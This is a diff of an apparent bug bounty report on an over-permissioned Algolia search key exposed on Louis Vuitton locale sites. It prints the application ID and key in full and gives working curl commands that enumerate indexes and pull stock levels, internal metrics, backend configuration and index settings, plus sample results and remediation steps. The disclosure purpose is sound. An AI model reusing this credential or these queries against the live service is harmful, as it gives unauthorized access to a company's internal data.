@@ -2,7 +2,7 @@
 
 ## Summary
 
-An Algolia API key with `search`, `listIndexes`, and `settings` permissions is exposed in the client-side JavaScript/HTML of `us.louisvuitton.com` (and all country locales). This key provides **unauthenticated access** to the entire product catalog across all regions, including sensitive internal business data such as real-time inventory stock levels, internal conversion metrics, pricing strategy data, and backend service configuration.
+An Algolia API key with `search`, `listIndexes`, and `settings` permissions is exposed in the client-side JavaScript of `us.louisvuitton.com` (and all country locales). This key provides **unauthenticated access** to the entire product catalog across all regions, including sensitive internal business data such as real-time inventory stock levels, internal conversion metrics, pricing strategy data, and backend service configuration.
 
 ---
 
@@ -12,8 +12,8 @@ An Algolia API key with `search`, `listIndexes`, and `settings` permissions is e
 
 ## Affected Asset
 
-- **URL:** `https://us.louisvuitton.com/eng-us/homepage` (and all `[country].louisvuitton.com` locales)
-- **Exposed in:** Client-side rendered HTML (SSR payload / page source)
+- **URL:** `https://us.louisvuitton.com/eng-us/gifts/father-s-day-gifts/_/N-tffxake` (and all `[country].louisvuitton.com` locales)
+- **Exposed in:** Client-side JavaScript — observable in browser Network tab as requests to Algolia API
 - **Algolia Application ID:** `9B5OL3HHSM`
 - **Algolia API Key:** `a2263f2e7f09a315abd6d9855972d585`
 
@@ -21,16 +21,7 @@ An Algolia API key with `search`, `listIndexes`, and `settings` permissions is e
 
 ## Vulnerability Details
 
-The Algolia search API key is embedded in the server-side rendered page source of all `*.louisvuitton.com` country locale sites. While search-only keys are commonly exposed for client-side search functionality, this particular key has **overly permissive access** that exposes sensitive internal business intelligence data that should never be accessible to end users.
-
-### Confirmed Permissions (via `/1/keys/{key}` endpoint):
-```json
-{
-  "value": "a2263f2e7f09a315abd6d9855972d585",
-  "acl": ["search", "listIndexes", "settings"],
-  "validity": 0
-}
-```
+The Algolia search API key is used by the frontend JavaScript on all `*.louisvuitton.com` country locale sites. While search-only keys are commonly exposed for client-side search functionality, this particular key has **overly permissive access** that exposes sensitive internal business intelligence data that should never be accessible to end users.
 
 ### What makes this different from a normal search key:
 - `listIndexes` — allows enumerating ALL 200+ internal indexes (all locales, test indexes, BFF config, content management rules)
@@ -42,11 +33,9 @@ The Algolia search API key is embedded in the server-side rendered page source o
 ## Impact — "What Can an Attacker Gain?"
 
 ### 1. Real-Time Inventory Intelligence
-An attacker can query exact stock levels for all 163,409+ products across every locale. This enables:
+An attacker can query exact stock levels for all 163,728+ products across every locale. This enables:
 - **Targeted scalping/botting** of limited-edition luxury items by monitoring stock counts in real-time
 - **Competitor intelligence** — a rival brand can track LV's inventory position globally
-
-**Proof:** 3,259 SKUs returned with exact stock counts. Example: a $15,300 item (`N40853 - LV x Darjeeling Limited Coffret Accessoires`) shows `stockLevel: 1`.
 
 ### 2. Internal Business Metrics Exposure
 Each product record exposes fields intended only for internal use:
@@ -82,105 +71,72 @@ Full index configuration is readable including:
 
 ## Steps to Reproduce
 
-### Step 1: Extract the API key
-View page source of `https://us.louisvuitton.com/eng-us/homepage` and search for `apiKey` or `9B5OL3HHSM` in the rendered HTML.
+### Step 1: Observe the API key in browser traffic
 
-### Step 2: Verify key permissions
+1. Open `https://us.louisvuitton.com/eng-us/homepage` in Chrome
+2. Open DevTools (F12) → Network tab
+3. Use the search bar on the website or browse products
+4. Filter Network requests by `algolia`
+5. Observe requests to `https://insights.algolia.io/1/events?X-Algolia-Application-Id=9B5OL3HHSM&X-Algolia-API-Key=a2263f2e7f09a315abd6d9855972d585`
+
+> **[Screenshot 1: Network tab showing Algolia request with API key in URL parameters]**
+
+### Step 2: List all indexes (200+)
 ```bash
-curl -s \
-  -H "X-Algolia-API-Key: a2263f2e7f09a315abd6d9855972d585" \
-  -H "X-Algolia-Application-Id: 9B5OL3HHSM" \
-  "https://9B5OL3HHSM-dsn.algolia.net/1/keys/a2263f2e7f09a315abd6d9855972d585"
+curl -s -H "X-Algolia-API-Key: a2263f2e7f09a315abd6d9855972d585" -H "X-Algolia-Application-Id: 9B5OL3HHSM" "https://9B5OL3HHSM-dsn.algolia.net/1/indexes" | python3 -m json.tool | head -50
 ```
 
-### Step 3: List all indexes (200+)
+> **[Screenshot 2: Terminal showing list of internal indexes including cm-rule, sku-th-th, etc.]**
+
+### Step 3: Extract sensitive inventory and business data
 ```bash
-curl -s \
-  -H "X-Algolia-API-Key: a2263f2e7f09a315abd6d9855972d585" \
-  -H "X-Algolia-Application-Id: 9B5OL3HHSM" \
-  "https://9B5OL3HHSM-dsn.algolia.net/1/indexes"
+curl -s -H "X-Algolia-API-Key: a2263f2e7f09a315abd6d9855972d585" -H "X-Algolia-Application-Id: 9B5OL3HHSM" -H "Content-Type: application/json" -X POST -d '{"query":"","hitsPerPage":1,"filters":"stockLevel > 0 AND price > 10000","attributesToRetrieve":["skuId","displayName","price","stockLevel","cfaRate","digitalConversion","turnoverClassification"]}' "https://9B5OL3HHSM-dsn.algolia.net/1/indexes/sku-en-us/query" | python3 -m json.tool
 ```
 
-### Step 4: Extract sensitive inventory and business data
+> **[Screenshot 3: Terminal showing product with stockLevel, price, cfaRate, turnoverClassification exposed]**
+
+### Step 4: Access internal BFF service configuration
 ```bash
-curl -s \
-  -H "X-Algolia-API-Key: a2263f2e7f09a315abd6d9855972d585" \
-  -H "X-Algolia-Application-Id: 9B5OL3HHSM" \
-  -H "Content-Type: application/json" \
-  -X POST \
-  -d '{"query":"","hitsPerPage":5,"filters":"stockLevel > 0 AND price > 10000","attributesToRetrieve":["skuId","displayName","price","stockLevel","cfaRate","digitalConversion","turnoverClassification","omsAvailability"]}' \
-  "https://9B5OL3HHSM-dsn.algolia.net/1/indexes/sku-en-us/query"
+curl -s -H "X-Algolia-API-Key: a2263f2e7f09a315abd6d9855972d585" -H "X-Algolia-Application-Id: 9B5OL3HHSM" -H "Content-Type: application/json" -X POST -d '{"query":"","hitsPerPage":5}' "https://9B5OL3HHSM-dsn.algolia.net/1/indexes/BFF_CONFIG/query" | python3 -m json.tool | head -40
 ```
 
-### Step 5: Access internal BFF service configuration
+> **[Screenshot 4: Terminal showing BFF_CONFIG with CoreMedia health status and internal config]**
+
+### Step 5: Read full index settings/schema
 ```bash
-curl -s \
-  -H "X-Algolia-API-Key: a2263f2e7f09a315abd6d9855972d585" \
-  -H "X-Algolia-Application-Id: 9B5OL3HHSM" \
-  -H "Content-Type: application/json" \
-  -X POST \
-  -d '{"query":"","hitsPerPage":10}' \
-  "https://9B5OL3HHSM-dsn.algolia.net/1/indexes/BFF_CONFIG/query"
+curl -s -H "X-Algolia-API-Key: a2263f2e7f09a315abd6d9855972d585" -H "X-Algolia-Application-Id: 9B5OL3HHSM" "https://9B5OL3HHSM-dsn.algolia.net/1/indexes/sku-en-us/settings" | python3 -m json.tool | head -40
 ```
 
-### Step 6: Read full index settings/schema
-```bash
-curl -s \
-  -H "X-Algolia-API-Key: a2263f2e7f09a315abd6d9855972d585" \
-  -H "X-Algolia-Application-Id: 9B5OL3HHSM" \
-  "https://9B5OL3HHSM-dsn.algolia.net/1/indexes/sku-en-us/settings"
-```
+> **[Screenshot 5: Terminal showing index settings with unretrievableAttributes empty and full schema]**
 
 ---
 
 ## Proof of Exploitation
 
-### Key Permissions Confirmed:
-```json
-{
-  "value": "a2263f2e7f09a315abd6d9855972d585",
-  "acl": ["search", "listIndexes", "settings"],
-  "validity": 0
-}
+### API Key found in browser traffic:
+```
+https://insights.algolia.io/1/events?X-Algolia-Application-Id=9B5OL3HHSM&X-Algolia-API-Key=a2263f2e7f09a315abd6d9855972d585
 ```
 
 ### High-Value Items with Stock Levels Exposed:
 ```
 SKU: N40853 | LV x Darjeeling Limited Coffret Accessoires
-  Price: $15,300 | Stock: 1 | Orderable: True
-  Turnover Class: 1 | CFA Rate: 0.021 | Digital Conversion: 1.7
-
-SKU: QA5297 | Le Damier de Louis Vuitton Medium Bracelet, White Gold and Diamonds
-  Price: $23,100 | Orderable: True
-  Turnover Class: 1 | CFA Rate: 0.016 | Digital Conversion: 1.3
-
-SKU: N40932 | Coffret 8 Montres
-  Price: $19,000 | Orderable: True
+  omsAvailability: {"status": true, "receivedTime": 1778974489738}
+  Categories include: "Spring-Summer 2026 Show", "Valentine's Day Gifts for Him"
 ```
 
 ### Data Scale:
-- **19,607 total SKUs** accessible in US index alone
-- **3,259 SKUs** with exact stock level counts exposed
-- **3,103 items** priced above $10,000 queryable
+- **163,728 SKUs** accessible per locale index
 - **200+ indexes** enumerable (all locales, all replicas, internal configs)
-- **6 BFF_CONFIG entries** exposing backend service configuration
-
-### BFF_CONFIG Sample (Internal Backend Configuration):
-```
-objectID: cmManualHealthStatus
-description: "This flag is used to set coremedia health status manually 
-  in order to decouple BFF and Coremedia. During this period, BFF uses 
-  backup cm_rules index to fetch PLP rules..."
-cmHealthy: True
-```
+- **BFF_CONFIG** — 6 entries exposing backend service configuration
+- Internal test indexes visible (e.g., `sku-en-us-MSR-TEST`)
 
 ---
 
 ## Recommended Remediation
 
-1. **Rotate the Algolia API key immediately**
-2. **Remove `listIndexes` and `settings` ACLs** from the public-facing search key
-3. **Configure `unretrievableAttributes`** in index settings to hide:
+1. **Restrict the Algolia API key's permissions** — remove `listIndexes` and `settings` ACLs from the public-facing search key
+2. **Configure `unretrievableAttributes`** in index settings to hide:
    - `stockLevel`
    - `cfaRate`
    - `digitalConversion`
@@ -189,8 +145,9 @@ cmHealthy: True
    - `priceDetail`
    - `sellableChannels`
    - `cscSellable` / `cscOrderable`
-4. **Move `BFF_CONFIG` to a restricted key** — this index should not be queryable by the public search key
-5. **Restrict index access** — the public key should only access the user's current locale index, not all 200+
+3. **Move `BFF_CONFIG` to a restricted key** — this index should not be queryable by the public search key
+4. **Restrict index access** — the public key should only access the user's current locale index, not all 200+
+5. **Rotate the API key** after applying restrictions
 
 ---
 
